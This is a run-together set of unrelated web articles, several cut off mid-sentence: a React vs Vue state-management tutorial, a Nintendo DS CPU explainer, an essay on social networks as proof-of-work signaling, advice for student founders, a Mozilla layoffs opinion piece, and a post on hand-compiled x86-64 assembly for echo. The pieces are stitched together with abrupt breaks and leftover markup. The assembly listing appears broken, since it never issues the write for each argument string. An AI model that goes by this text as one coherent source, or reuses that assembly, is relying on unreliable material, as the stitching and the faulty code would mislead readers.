<p>With React — or at least since 2019 — we would typically handle state through a series of Hooks.
These might look a bit strange at first if you haven’t seen this type of concept before. Basically,
it works as follows:</p>
<p>Let’s say we want to create a list of todos. We would likely need to create a variable called list
and it would likely take an array of either strings or maybe objects (if say we want to give each
todo string an ID and maybe some other things. We would set this up by writing
<code>const [list, setList] = useState([])</code>. Here we are using what React calls a Hook — called
<code>useState</code>. This basically lets us keep local state within our components.</p>
<p>Also, you may have noticed that we passed in an empty array <code>[]</code> inside of <code>useState()</code>. What we put
inside there is what we want list to initially be set to, which in our case, we want to be an empty
array. However, you will see from the image above that we passed in some data inside of the array,
which ends up being the initialised data for list. Wondering what setList does? There will be more
on this later!</p>
<p>In Vue, you would typically place all of your mutable data for a component inside of a <code>setup()</code>
function that returns an object with the data and functions you want to expose (which basically just
means the things you want to be able to make available for use in your app). You will notice that
each piece of state (aka the data we want to be able to mutate) data in our app is wrapped inside of
a <code>ref()</code> function. This <code>ref()</code> function is something that we import from Vue and makes it possible
for our app to update whenever any of those pieces of data are changed/updated. In short, if you
want to make mutable data in Vue, assign a variable to the <code>ref()</code> function and place any default
data inside of it.</p>
<h3>So how would we reference mutable data in our app?</h3>
<p>Well, let’s say that we have some piece of data called name that has been assigned a value of
<code>Sunil</code>.</p>
<p>In React, as we have our smaller pieces of state that we created with <code>useState()</code>, it is likely
that we would have created something along the lines of <code>const [name, setName] = useState('Sunil')</code>.
In our app, we would reference the same piece of data by calling simply calling name. Now the key
difference here is that we cannot simply write <code>name = 'John'</code>, because React has restrictions in
place to prevent this kind of easy, care-free mutation-making. So in React, we would write
<code>setName('John')</code>. This is where the setName bit comes into play. Basically, in
<code>const [name, setName] = useState('Sunil')</code>, it creates two variables, one which becomes
<code>const name = 'Sunil'</code>, while the second <code>const setName</code> is assigned a function that enables name to
be recreated with a new value.</p>
<p>In Vue, this would be sitting inside of the <code>setup()</code> function and would have been called
<code>const name = ref(‘Sunil')</code>. In our app, we would reference this by calling <code>name.value</code>. With Vue,
if we want to use the value created inside of a <code>ref()</code> function, we look for <code>.value</code> on the
variable rather than simply calling the variable. In other words, if we want the value of a variable
that holds state, we look for <code>name.value</code>, <em>not</em> <code>name</code>. If you want to update the value of <code>name</code>,
you would do so by updating <code>name.value</code>. For example, let's say that I want to change my name from
Sunil to John. I'd do this by writing <code>name.value = "John"</code>. I’m not sure how I feel about being
called John, but hey ho, things happen! 😅</p>
<p>Effectively React and Vue are doing the same thing here, which is creating data that can be updated.
Vue essentially combines its own version of name and setName by default whenever a piece of data
wrappeed inside of a <code>ref()</code> function gets updated. React requires that you call setName() with the
value inside in order to update state, Vue makes an assumption that you’d want to do this if you
were ever trying to update values inside the data object. So Why does React even bother with
separating the value from the function, and why is <code>useState()</code> even needed? Essentially, React
wants to be able to re-run certain life cycle hooks whenever state changes. In our example, if
<code>setName()</code> is called, React will know that some state has changed and can, therefore, run those
lifecycle hooks. If you directly mutated state, React would have to do more work to keep track of
changes and what lifecycle hooks to run etc.</p>
<p>Now that we have mutations out of the way, let’s get into the nitty, gritty by looking at how we
would go about adding new items to both of our To Do Apps.</p>
<h3>How do we create new To Do Items?</h3>
<h4>React:</h4>
<pre><code>const createNewToDoItem = () =&gt; {
    const newId = generateId();
    const newToDo = { id: newId, text: toDo };
    setList([...list, newToDo]);
    setToDo("");
};
</code></pre>
<h4>How did React do that?</h4>
<p>In React, our input field has an attribute on it called <strong>value. </strong>This value gets automatically
updated every time its value changes through what is known as an <strong>onChange event listener</strong>. The
JSX (which is basically a variant of HTML), looks like this:</p>
<pre><code>&lt;input
    type="text"
    placeholder="I need to..."
    value={toDo}
    onChange={handleInput}
    onKeyPress={handleKeyPress}
/&gt;
</code></pre>
<p>So every time the value is changed, it updates state. The handleInput function looks like this:</p>
<pre><code>const handleInput = (e) =&gt; {
    setToDo(e.target.value);
};
</code></pre>
<p>Now, whenever a user presses the <strong>+ </strong>button on the page to add a new item, the <strong>createNewToDoItem
</strong>function is triggered. Let’s take a look at that function again to break down what is going on:</p>
<pre><code>const createNewToDoItem = () =&gt; {
    const newId = generateId();
    const newToDo = { id: newId, text: toDo };
    setList([...list, newToDo]);
    setToDo("");
};
</code></pre>
<p>Essentially the <code>newId</code> function is basically creating a new ID that we will give to our new <code>toDo</code>
item. The <code>newToDo</code> variable is an object that takes that has an id key that is given the value from
newId. It also has a <code>text</code> key which takes the value from <code>toDo</code> as its value. That is the same
<code>toDo</code> that was being updated whenever the input value changed.</p>
<p>We then run out setList function and we pass in an array that includes our entire <code>list</code> as well as
the newly created <code>newToDo</code>.</p>
<p>If the <code>...list</code>, bit seems strange, the three dots at the beginning is something known as a spread
operator, which basically passes in all of the values from the <code>list</code> but as separate items, rather
than simply passing in an entire array of items as an array. Confused? If so, I highly recommend
reading up on spread because it’s great!</p>
<p>Anyway, finally we run <code>setToDo()</code> and pass in an empty string. This is so that our input value is
empty, ready for new toDos to be typed in.</p>
<h4>Vue:</h4>
<pre><code>function createNewToDoItem() {
    const newId = generateId();
    list.value.push({ id: newId, text: todo.value });
    todo.value = "";
}
</code></pre>
<h4>How did Vue do that?</h4>
<p>In Vue, our <strong>input</strong> field has a handle on it called <strong>v-model</strong>. This allows us to do something
known as <strong>two-way binding</strong>. Let’s just quickly look at our input field, then we’ll explain what is
going on:</p>
<pre><code>&lt;input
    type="text"
    placeholder="I need to..."
    v-model="todo"
    v-on:keyup.enter="createNewToDoItem"
/&gt;
</code></pre>
<p>V-Model ties the input of this field to a variable we created at the top of our <code>setup()</code> function
and then exposed as a key inside of the object we returned. We …</p></article></section></div></div></div>

There will be some innovation and a few compromises, but this combination may pave the way for new and ingenious content.</p><hr><h2 id="cpu">CPU</h2><p>As with Nintendo’s <a href="https://www.copetti.org/projects/consoles/game-boy-advance/">previous portable console</a>, the system revolves around a big chip named <strong>CPU NTR</strong>. ‘NTR’ is shorthand for ‘Nitro’, the codename of the original Nintendo DS.</p><p>Now, CPU NTR implements an interesting multi-processor architecture using two different ARM CPUs, this design was done before ARM Holdings officially released multi-processor solutions. So, their functioning may be considered a bit unorthodox taking into account the present technology available.</p><p>While this is not the first parallel system analysed for <a href="https://www.copetti.org/projects/consoles/">this series</a>, its design is very different from the rest. For instance, we are not talking about the ‘experimental’ master-slave configuration that the <a href="https://www.copetti.org/projects/consoles/sega-saturn/">Saturn</a> debuted or the ‘co-processor’ approach found on the <a href="https://www.copetti.org/projects/consoles/playstation/">PS1</a> or <a href="https://www.copetti.org/projects/consoles/nintendo-64/">N64</a>. The Nintendo DS includes two very independent computers that will perform exclusive operations, each one having a dedicated bus. This co-dependency will condition the overall performance of this console.</p><p>That being said, let’s take a look now at the two CPUs:</p><div><ul><li id="tab-1-1-arm7tdmi-link"><a href="#tab-1-1-arm7tdmi">ARM7TDMI</a></li><li id="tab-1-2-arm946e-s-link"><a href="#tab-1-2-arm946e-s">ARM946E-S</a></li></ul><div><div id="tab-1-1-arm7tdmi"><h4>ARM7TDMI</h4><div><a href="https://www.copetti.org/images/consoles/nintendods/cpu/arm7_core.8a9851c20df1dda3c252ae75f544a8ce7a6749026fa4bc870027741cda1003b4.png"><picture>

It still includes all its original features (especially <a href="https://www.copetti.org/projects/consoles/game-boy-advance/#whats-new">Thumb</a>).</p><p>Now for the changes: Because Nintendo’s engineers placed the ARM7 next to most of the I/O ports, this CPU will be tasked with arbitrating and assisting I/O operations. In fact, no other processor can directly connect to the I/O. As you can see, this is not the ‘main’ processor that will be in charge of the system, but rather the ‘sub-processor’ offloading the main CPU by passing data around many components.</p></div><div id="tab-1-2-arm946e-s"><h4>ARM946E-S</h4><div><a href="https://www.copetti.org/images/consoles/nintendods/cpu/arm9_core.213329ca27287083c84d30b27fb9da63edd81998406a10b9ee7289089d0fe94d.png"><picture>

If you ignore the ill-fated ARM8 series, you could say the ARM946E-S is the ‘next-gen’ version of the ARM7. Part of the <strong>ARM9 series</strong>, this core in particular not only inherits all the features of the <strong>ARM7TDMI</strong> but also includes some additional bits:</p><ul><li>The <strong>ARMv5TE ISA</strong>: Compared to the previous v4, features some new instructions and a faster multiplier.<ul><li>If you take a look at the core name, the letter ‘E’ means <strong>Enhanced DSP</strong> which implies that lots of these new instructions have to do with applications for signal processing.</li></ul></li><li><strong>5-stage Pipeline</strong>: This is another increment from the previous 3-stage pipeline.</li><li><strong>12 KB of L1 Cache</strong>: The core now features cache, where 8 KB are allocated for instructions and 4 KB for data.</li><li><strong>48 KB of Tightly-Coupled Memory</strong> or ‘TCM’: Similar to <a href="https://www.copetti.org/projects/consoles/playstation/#cpu">Scratchpad memory</a>, however this one discriminates between instructions (32 KB) and data (16 KB).</li></ul><p>Nintendo also added the following components around it:</p><ul><li>A <strong>Divisor and Square root unit</strong> to speed up these type of operations (the ARM9 by itself is not capable of performing this type of math).</li><li>A <strong>Direct Memory Access Controller</strong>: Accelerates memory transfers without depending on the CPU. Combined with the use of cache, both CPU and DMA can potentially work concurrently.<ul><li>Cache and DMA can provide a lot of performance but also create new problems, such as data integrity. So programmers will have to manually maintain memory consistency by flushing the <a href="https://www.copetti.org/projects/consoles/playstation-2/#preventing-past-mishaps">write-buffer</a> before triggering DMA, for instance.</li></ul></li></ul></div></div></div><p>I guess with hardware like this, it’s easy to figure out the <em>real</em> reason kids loved this console, eh?</p><h4 id="interconnection">Interconnection</h4><p>So far I’ve talked about how the two CPUs work individually. But to work as a whole, they require to co-operate constantly. To accomplish this, both CPUs directly ‘talk’ to each other using a dedicated <strong>FIFO unit</strong>, this block of data holds two 64-byte queues (up to 16 elements) for <strong>bi-directional communication</strong>.</p><div><a href="https://www.copetti.org/images/consoles/nintendods/cpu/fifo.4c452b5f9236fb1e98454d2f90d2cab902ee4c561e165e8eaf8a8fc0cd7a05f4.png"><picture>

Alternatively, an <strong>interrupt unit</strong> can be activated to notify the receiver whenever there’s a new value in the queue.</p><h4 id="main-memory">Main memory</h4><p>Just like its predecessor, RAM is spread around many different locations, enabling to prioritise data placement by speed of access. In summary, we have the following general-purpose memory available:</p><div><div><a href="https://www.copetti.org/images/consoles/nintendods/cpu/ram.99e9bd12e464182ef51ea4aa89a7fc60323a46a72550afbacd737957372cf190.png"><picture>

Therefore, behaving like SRAM (the faster, but more expensive alternative to DRAM). This design reminds me of <a href="https://www.copetti.org/projects/consoles/gamecube/#clever-memory-system">1T‑SRAM</a>.</li></ul></li></ul></div><h4 id="backwards-compatibility">Backwards compatibility</h4><p>Even though the architecture is significantly different from its predecessor, it still managed to maintain the critical bits that would grant it native compatibility with GameBoy Advance games.</p><p>But for the DS to revert to an ‘internal’ GBA, the former includes a set of software routines that set the console in <strong>AGB Compatibility Mode</strong>. In doing so, it effectively halts the ARM9, disables most of the ‘special’ hardware, redirects the buses, puts the ARM7 in charge and slows it down at 16.78 MHz. Finally, the ARM7 proceeds to boot the original AGB BIOS which bootstraps the GamePak cartridge (just like an original GameBoy Advance). This mode still exhibits some features not found in the original console, such as displaying the game with black margins (we’ll see in the next section that the new screen resolution happens to be bigger). Moreover, since the DS has two screens, users can set which screen will be used to display the GBA game.</p><p>Once in GBA mode <strong>there’s no going back</strong>, the console must be reset to re-activate the rest of the hardware.</p><h4 id="secrets-and-limitations">Secrets and limitations</h4><p>With so many sophisticated components fitted in a single and inexpensive chip, it’s no mystery that some issues emerged due to the way they were forced to work with each other.</p><div><ul><li id="tab-2-1-unused-power-link"><a href="#tab-2-1-unused-power">Unused Power</a></li><li id="tab-2-2-a-question-about-the-hardware-choice-link"><a href="#tab-2-2-a-question-about-the-hardware-choice">A question about the hardware choice</a></li></ul><div><div id="tab-2-1-unused-power"><h4>Unused Power</h4><p>Sometimes I wonder how Nintendo planned the way the two CPU’s would be used, and if they already assumed some performance would be hit by the design they chose.</p><p>Let me start with the ARM9, this CPU runs at twice the speed of the ARM7, but most (if not all) of the I/O depends on the ARM7, so the ARM9 is vulnerable to excessive stalling until the ARM7 answers. If that wasn’t enough, <strong>ARM9’s external bus runs at half the speed</strong>, so there are a few bottlenecks identified.</p><p>Additionally, the Main Memory bus is only <strong>16-bit wide</strong>. Thus, whenever any CPU needs to fetch a word (32-bit wide) from memory, the interface <strong>stalls the CPU</strong> (up to 3 ‘wait’ cycles) until a full world is reconstructed. The worst impact happens when memory access is not sequential, which makes it stall for every single access. This issue will also arise when instructions are fetched (unfortunately, ARM didn’t support sequential opcode fetching back then) which, to my dismay, also affects Thumb code (since every 16-bit fetch is done as a 32-bit block). On the other hand, this penalty (as some sources call it) can be alleviated by making full use of cache and TCM.</p><p>All in all, this means that in the worst case, the ‘whooping’ ARM9’s 66 MHz horsepower is practically reduced to a mere ~8&nbsp;MHz. That is if the program makes an abysmal use of cache/TCM.</p></div><div id="tab-2-2-a-question-about-the-hardware-choice"><h4>A question about the hardware choice</h4><p>Back when I read about the CPU of the GameBoy Advance, I was really surprised by the potential of the ARM7: The CPU not only performed its designated tasks, but could also assist with others, such as providing audio sequencing or pseudo-3D graphics.</p><p>Now, during the commercialisation ARM7, ARM Holdings joined forces with DEC to design a high-end version of ARM’s chips. For this, DEC grabbed the datapath design of their processor, <strong>Alpha</strong>, and mixed it with ARM’s. The result was a new series of CPUs called <strong>StrongARM</strong> which was surprisingly <em>fast</em>. At the expense of removing certain features (Thumb and debug), DEC managed to cross the megahertz threshold by reaching speeds of up to 233 MHz. As a normal user prepared to buy a new ARM PC (let’s say a <em>RiscPC</em>), you could either choose one with the old ARM710 at 40 MHz or another one with a StrongARM running ~582% faster. The impact of StrongARM was so disruptive that ARM Holdings absorbed some of StrongARMs features to produce their next line of CPUs, starting with ARM9. And the rest is history.</p><p>But here’s where my question resides: Considering the new developments in the ARM world, why did Nintendo ultimately choose an awfully slow ARM9 combined by an even slower ARM7, instead of a faster ARM9 (or even a StrongARM)? To give you an idea, other companies like Apple just adopted the StrongARM with their Newton PDA line.</p><p>I don’t mean to criticise Nintendo’s choice, but I believe the amount of emerging technology was just too great for me to ignore. I guess their choice was done in an effort to preserve battery life and maintain production costs (by using the same CPU found in the GBA).</p></div></div></div><hr><h2 id="graphics">Graph…</h2></div></div></div>

<p><span>01</span> Intro</p>



<p>Sparked by <a href="https://twitter.com/dwr/status/1273307320911450112">an interesting Twitter discussion</a>, I’ve spent a lot of time recently thinking about different proof-of-work mechanisms. </p>



<p>When I say proof-of-work, I’m not talking about consensus algorithms like the ones that some crypto currencies use. I’m talking about social networks.</p>



<p>At their core, social networks are primarily about one thing: Building social capital through signaling. As I wrote in <a href="http://julian.digital/2020/03/28/signaling-as-a-service/">Signaling as a Service</a>, signaling can be broken down into three different components:</p>



<ul><li><strong>Signaling Message</strong><br>A hidden status subtext you’re trying to convey about yourself</li><li><strong>Signaling Distribution</strong><br>The channel through which you’re communicating your signaling message</li><li><strong>Signaling Amplification</strong><br>Ways to boost your signaling message to compete against status rivals</li></ul>



<p>For example: A Patagonia vest signals both a prosocial attitude (<em>“I care about the environment</em>“) as well as wealth (“<em>I can afford to spend $500 on a jacket</em>“). Depending on where you live, it might also signal something about <a href="https://vcstarterkit.com/">your occupation</a>.</p>



<p><img src="https://julian.digital/wp-content/uploads/2020/07/patagucci.png"></p><p>In order to signal these messages to others and build actual social capital you need a signaling distribution channel. One option would be to wear the vest in public where others can see it – but there are obvious physical constraints to the size of the audience you’d be able to reach.</p>



<p>This is where social networks come in.</p>



<p>Their primary role is to distribute signaling messages at scale and transform them into quantifiable social capital (in the form of likes and followers).</p>



<p>As social networks grow, they increase the potential reach of your signaling messages – but they also get crowded with status rivals. This is why social networks typically provide you with a set of signaling amplification tools. These tools help you boost your signaling messages and stand out from the crowd.</p>



<p>In <a href="http://julian.digital/2020/03/28/signaling-as-a-service/">Signaling as a Service</a> I compared signaling amplification to <a href="https://www.eugenewei.com/blog/2019/2/19/status-as-a-service">Eugene Wei’s idea of proof-of-work hurdles</a>, which he describes as follows:</p>



<p><i>Almost every social network of note had an early signature proof of work hurdle. For Facebook it was posting some witty text-based status update. For Instagram, it was posting an interesting square photo. For Vine, an entertaining 6-second video. For Twitter, it was writing an amusing bit of text of 140 characters or fewer. Pinterest? Pinning a compelling photo. You can likely derive the proof of work for other networks like Quora and Reddit and Twitch and so on. Successful social networks don’t pose trick questions at the start, it’s usually clear what they want from you.</i></p>



<p>But the more I think about it, the less I like the comparison. I actually think that Eugene’s proof-of-work theory only scratches the surface of what social networks actually do.</p>



<p>Let me explain.</p>



<p><span>02</span> A closer look at proof mechanisms</p>



<p>Take a look at this very cliché Instagram picture. The photographer clearly put a lot of thought and effort into its composition and applied different filters and editing tools to make it look nicer.</p>



<figure>
<img src="https://julian.digital/wp-content/uploads/2020/08/creativework.png">
<figcaption><span>Full disclosure: I actually took this picture from Unsplash. No influencers were harmed during the production of this blog post.<br></span>
</figcaption></figure>



<p>It’s a perfect example of Eugene’s definition of proof-of-work. <br>Proof-of-<strong><em>creative</em></strong>-work, to be more exact. </p>



<p>Editing your photo helps to amplify your signaling message and sets you apart within Instagram’s status arena (aka the newsfeed). It also adds additional signaling messages to your post: <em>“Look how great a photographer I am”</em> or <em>“I’m a creative person”</em>.</p>



<p>But those are not the main signaling messages you are communicating here. What you really want to tell your followers with this photo is something along the lines of <em>“I’m a world-traveler”</em> and <em>“I’m in a happy relationship”</em> <span>(which in turn are also just signaling proxies for wealth and mating worthiness)</span>. </p>



<p>The photo and the location tag are your proof points.</p>



<figure><img src="https://julian.digital/wp-content/uploads/2020/07/igexample02-1.png">
<figcaption><span>If you look closely, you’ll notice additional hidden signaling messages in the form of Allbirds sneakers and what’s most likely a Patagonia vest → proof-of-ownership<br></span>
</figcaption></figure>



<p>Social networks are therefore not only signaling distribution (and amplification) networks – they also allow users to prove their signaling messages. </p>



<p>The creative proof-of-work is just pretext and helps to boost your post. What’s more important are the additional proof mechanisms that social networks provide. In the case of Instagram those are photos and location tags.</p>



<p>Instagram is essentially “pics or it didn’t happen”-as-a-service.</p>



<p><span>03</span> Implications for new social networks</p>



<p>When new social networks emerge they have to introduce new proof mechanisms to differentiate themselves from existing incumbents. These can either be novel proof-of-creative-work hurdles or completely new proof-of-x mechanisms.</p>



<p>TikTok is a good example for proof-of-<em>creative</em>-work innovation. The app provides creators with a powerful set of video editing tools that have opened a whole new level of creativity. </p>



<p>The cost to participate in TikTok’s status game is a lot higher than Instagram’s <span>(compare a well-made dance choreography on TikTok to your median Instagram travel post)</span> – but its powerful feed algorithms also make discovery easier and thus reward users faster and with more social capital. </p>



<p>TikTok doesn’t add any new proof points beyond its novel creative work hurdle though. You can signal and prove your creativity but you could achieve the same by uploading your video to Instagram.</p>



<p>Strava, on the other hand, introduced an entirely new proof mechanism: Proof-of-physical-activity. By using your phone’s GPS sensor (or a 3rd-party fitness tracker), users can actually prove how much and fast they ran or cycled. In contrast to <a href="https://www.telegraph.co.uk/news/2017/10/20/grounded-private-jet-hire-helps-russians-fake-lavish-lifestyles/">Instagram</a> <a href="https://www.vice.com/da/article/wdaqgw/instagrams-ballers-discount-private-jets-324">photos</a>, Strava’s proof mechanism is a lot harder to fake <span>(though there are <a href="https://www.google.com/search?q=fake+strava+5k+downhill&amp;oq=fake+strava+5k+downhill">exceptions</a>)</span>.</p>



<p><img src="https://julian.digital/wp-content/uploads/2020/08/stravaproof.png"></p><p>What’s great about Strava is that it reinforces a behavior that’s actually good for you: While the status game that initially got you into the app might be zero sum, the actual physical exercise you have to put in to compete has a very positive, compounding effect.</p>



<p>The question is: What other social networks should we build that could have similar positive feedback loops? And what are their proof mechanisms?</p>



<p><span>04</span> Strava for X</p>



<p>Let’s start with the two examples in <a href="https://twitter.com/dwr/status/1273307320911450112">this tweet</a>.</p>



<p><img src="https://julian.digital/wp-content/uploads/2020/08/tweetstrava.png"></p><p>I love the idea of a <strong>Strava for Cooking</strong> – but I’m very skeptical that it can be built. Why? Because the necessary proof mechanisms don’t exist.</p>



<p>The primary metric you optimize on when cooking is taste. But how would you measure or quantify taste? The closest proxy to taste that we have is optics: How good does the meal that you cooked look? This can easily be proved with a photo .. but that’s a proof-of-work mechanism that Instagram already offers (including filters to make your food look nicer). As long as no one comes up with a better proof mechanism for cooking, I think it’s unlikely that we will see a successful social network in the space.</p>



<p>I’m more optimistic about <strong>Strava for Learning</strong>.</p>



<p>While the activity of learning itself might be hard to quantify, you can measure the outcome of learning: knowledge. Has anyone built a multiplayer version of <a href="https://apps.ankiweb.net/">Anki</a> yet? Flash cards would be a perfect proof-of-knowledge mechanism and could easily be turned into a game where you compete against friends.</p>



<p>Similar to physical activity in the Strava example, learning is not something that most people enjoy doing. As TikTok founder <a href="https://youtu.be/wTyg2E44pBA?t=245">Alex Zhu points out</a>, education goes a little against human nature. In combination with a strong enough signaling mechanism however, you can get users to participate. It’s kind of the opposite of <a href="https://cdixon.org/2015/01/31/come-for-the-tool-stay-for-the-network">Chris Dixon’s famous “Come for the tool, stay for the network” strategy</a>. Come for the status, stay for the tool.</p>



<p>A related product I’d love to see is <strong>Strava for Reading</strong>. Imagine an eBook reader that not only tracks how much time you spend reading but also *what* you are reading. Based on these proof-of-(reading)-work mechanisms you could build streaks or GitHub-contributions-like visualizations that incentivize users to read more (and more regularly).</p>



<p><img src="https://julian.digital/wp-content/uploads/2020/07/githubforreading.png"></p><p>You could even build leaderboards for different topics based on the content of the books and articles you read. Or think about a score that indicated how balanced your reading behavior per topic was (to incentivize users to read takes on political topics from different perspectives).</p>



<p>Unfortunately, I think it’s unlikely that we will see a product like I described anytime soon. <a href="https://twitter.com/lehrjulian/status/1086659965719404544">The world’s largest bookstore, most popular eBook reader, and biggest social network for books</a> are all owned by a company that has very little competency in design and user-facing product innovation.</p>



<p>(Side note: Amazon’s monopoly on books might be the most underrated sub-optimal equilibrium in tech.)</p>



<p>Another app that would be interesting is a social investing app. Think “Robinhood but as a social network”. It seems like investing is already quite a social activity – just look at <a href="https://www.bloomberg.com/news/articles/2020-02-26/reddit-s-profane-greedy-traders-are-shaking-up-the-stock-market">communities like r/wallstreetbets</a>. As <a href="https://twitter.com/patio11/status/1250703738634829824">patio11 pointed out</a>, Robinhood already feels more like a game than a finance app.</p>



<p><img src="https://julian.digital/wp-content/uploads/2020/08/robinhood.png"></p><p>So why not build an investing app that opens with a feed of all your friends’ investments and their returns over time? Instead of sharing screenshots on Reddit and Instagram you could prove your investments right in the app.</p>



<p><strong>Note that an app like this would not be about signaling wealth. It’s about signaling <em>being right</em> and the ability to prove it</strong>. This is probably an even stronger and more engaging mechanism than signaling wealth – and the reason why I’m still bullish on prediction markets.</p>



<p>Perhaps a well-designed, consumer-friendly prediction market app would be the ultimate proof-of-x social network. <strong>Strava for being right.</strong></p>



<p><span>05</span> A Closing Ask</p>



<p>While we are on the topic of being right: Do you agree with my thoughts in this post? What other social networks and proof-of-x mechanisms would you like to see?</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Many students don’t fathom the possibility of creating something new. Tons of great things solving real problems get built as class projects, hackathon projects, or side-projects for the sake of personal learning. Lots of these projects have tons of potential, but I don’t see enough students taking those high potential projects one step further.</p><p>I think it might be due to how clear the traditional path is. Go to school, try to achieve good grades, then do what it takes to get that job. Learn a lot of programming languages so you can slap them on the resume. Build one or two projects that could make you stand out on paper. In my view, building things not for the sake of creating something new, but to bolster one’s reputation minimizes the impact a great idea or project can deliver.</p><p>So I’m writing this article, because I believe that many student founders don’t realize the prime position they’re in. Responsibilities pile up, including studying and extracurricular involvements, but the amount of resources students have access to is crazier than many believe.</p><p>1. <strong>People love helping student founders</strong>. I talked a bit about getting past imposter syndrome yesterday, and to understand that people come from similar roots. Those in positions to help you were probably students themselves, who were looking for guidance from others too. They know that it’s hard, and are more willing than you think to lend a hand. It’s just a matter of reaching out. (If <a href="https://imprint.to/user/rz">@richard</a> could successfully cold email Mark Cuban for help, imagine how many others would be happy to help!)</p><figure><img src="https://cosmonaut-storage.s3.amazonaws.com/441594976770449_image.png"></figure><p>2. <strong>Companies love supporting students</strong>. Take advantage of all the deals and programs that companies offer! They make it super affordable (often free) to get something off the ground. Here’s a few of my favorite products with great student deals:</p><ul><li>Github Student Pack (tons of dev and SaaS tools for free)</li><li>Notion</li><li>Figma</li><li>PersistIQ</li><li>Loom</li></ul><p>3.<strong> Tons of underutilized institutions setup for student founders</strong>. Institutions are in place all over the country. Entrepreneurship organizations provide like minded students and a great place to find co-founders. Hackathons give you unlimited fuel (food + energy drinks) and an environment to build cool stuff. Keep on the lookout for on-campus accelerator programs and such too. Moral of the story, there are tons of resources out there, it's just up to you to seek them out and to take advantage while you're there.</p><p>4. <strong>Safety net</strong>. I want to note that this doesn’t apply to everyone, since different financial situations change the effect of this safety net. But I’ll say that if you’re a university student, the cost of failure won’t be as high. If you fail, you go back to focusing on classes and activities. As an adult with a family or a stable job, pursuing a startup inherently poses a higher risk. Your #1 job as a student is to learn anyway, and there’s no place you can learn more than from building something from scratch and figuring out the bits and pieces as you go.</p><p>If you’re a student who’s considering building something, go for it. And if you’ve already worked on something cool for a class or anything, think and talk to some people about the value it provides. If it’s solving a legitimate issue, then consider pumping some energy into that old project. Who knows where it could go?</p></div><div><div><p><a href="https://roland.imprint.to/">Roland's Notes</a></p><p>My thoughts, stories, and ideas</p></div></div></div>]]>

The current Corona crisis have contributed to this. However, the explanation for this action is only PR-speech. In the message to all employees there is again talk of new products and they are supposed to adopt a new way of thinking. Mozilla has often been criticized in the past. Projects like pocket, Send, Lockwise, Firefox OS were/are either born dead and/or burned a lot of money and resources. I have never met anyone in my professional life who has used the additional products or features. Honestly. Me neither.</p><p>According to unofficial information e.g. via Twitter or Github the documentation team, the Firefox engine team (Gecko) and the security team are affected (<a href="https://twitter.com/MichalPurzynski/status/1293220570885062657" target="_blank" rel="noopener noreferrer">1</a>, <a href="https://twitter.com/gcpascutto/status/1293519587967983616" target="_blank" rel="noopener noreferrer">2</a>, <a href="https://github.com/servo/servo/discussions/27575" target="_blank" rel="noopener noreferrer">3</a>, <a href="https://twitter.com/SteveALee/status/1293487542382333952" target="_blank" rel="noopener noreferrer">4</a>).

As an administrator in the main job and helper in the private sphere for some people, Firefox as a browser can no longer be an option. The danger of unpatched security holes and lack of further development in the core area endangers the infrastructure and systems. Decision makers also have to pay attention to this when it comes to equipping company networks with software. An organization that buries the most important committees for the maintenance of its products no longer has a product.</p><p>If Mozilla wants to survive, the management will be fired with unearned compensation, the most important departments will be strengthened, products that nobody ordered will be discontinued and the organization will be limited to its core competence. Browser, email, security, adaptability and the fight for a free Internet. And they work with all their might to ensure that the products will become an integral part of everyday life and all operating systems.</p><p>Three months. That’s all the time they have for a clear signal. After that, users have to make a decision.

    <h2 id="title">2020-08-12: Can we do better than our C compiler?</h2>
<p>Today, I wanted to become a C compiler. I added a <a href="https://github.com/ibara/echo/blob/master/echo.s">hand-compiled assembly version of echo</a> from <a href="https://briancallahan.net/blog/20200808.html">our previous coding exercise</a> and added a new make target, <code>make asm</code>, that will assemble it. Let's look at our hand-compiled assembly and compare it to our C compiler and ask whether or not it was worth it.</p>
<h4>My hand-compiled assembly</h4>
<p>It's quite small.</p>
<pre>	.text
	.p2align 2
	.globl	main
	.type	main,@function
main:
	movq	%rdi, %r15	# Get argc from %rdi, put it in %r15
	movq	%rsi, %r14	# Get argv from %rsi, put it in %r14
loop:
	decl	%r15d		# 47: for (i = 0; i &lt; argc; i++) {
	jz	done		# Rewritten as: while (--argc) {
	addq	$8, %r14	# ++argv
	movl	$4, %eax	# Set up write(2)
	movl	$1, %edi	# First parameter is 1
	movq	(%r14), %rsi	# Second parameter is *argv
	leaq	-1(%rsi), %rdx	# Get *argv[0]
strlen:				# Note: strlen has been inlined
	cmpb	$0, 1(%rdx)	# 36: while (*t != '\0')
	leaq	1(%rdx), %rdx	# 37: t++;
	jne	strlen
	subq	%rsi, %rdx	# 39: return t - s;

	movl	$4, %eax	# Set up write(2)
	movl	$1, %edi	# First parameter is 1

	movb	$32, (%rsi)	# Second parameter is " "
	movl	$1, %edx	# Third parameter is 1
	syscall			# 50: write(1, " ", 1);
	jmp	loop
done:
	movl	$4, %eax	# Set up write(2)
	movl	$1, %edi	# First parameter is 1
	movq	%r14, %rsi	# Set %rsi back to beginning of *argv
	movb	$10, (%rsi)	# Second parameter is "\n"
	movl	$1, %edx	# Third parameter is 1
	syscall			# 52: write(1, "\n", 1);
	xorl	%eax, %eax	# Return value is 0
	retq			# 54: return 0;
	.size	main,.-main

<p>The whole source is annotated. Comments that begin with a number are for easy cross-referencing with our <a href="https://github.com/ibara/echo/blob/master/echo.c">C version of echo</a>.</p>
<h4>Better optimization for the C code</h4>
<p>The primary tricks are are a manual inlining of the strlen function and not needing the write and _syscall functions, instead being able to use syscall directly. We could inline strlen in the C code if we wanted, but the compiler is very likely to do that for us anyway. We probably can't avoid the write and _syscall functions in C, as we discussed previously.</p>
<p>There is also some rewriting of loops to avoid the use of variables: the <code>for (i = 0; i &lt; argc; i++)</code> is rewritten as <code>while (--argc)</code> and <code>if (i + 1 != argc)</code> becomes <code>if (argc != 1)</code>, which means that we can get rid of the <code>int i</code> variable and increment through argv with <code>++argv</code>. These changes can of course be applied to the C code as well.</p>
<p>Some other tricks include using *argv as scratch space for our space and newline characters. We don't actually care what the value of *argv is once we've written it out—we only use it the one time. So it becomes free memory space for us to overwrite it with whatever we want (as long as things fit; our space and newline characters are a single byte each so we're safe). We could do this one in C too if we wanted.</p>
<p>If we made these changes, our new main function in C might look like this.</p>
<pre>int
main(int argc, char *argv[])
{

	while (--argc) {
		++argv;
		write(1, *argv, strlen(*argv));
		if (argc != 1) {
			*argv[0] = ' ';
			write(1, *argv, 1);
		}
	}
	*argv[0] = '\n';
	write(1, *argv, 1);

	return 0;
}
</pre>
<h4>Even better assembly?</h4>
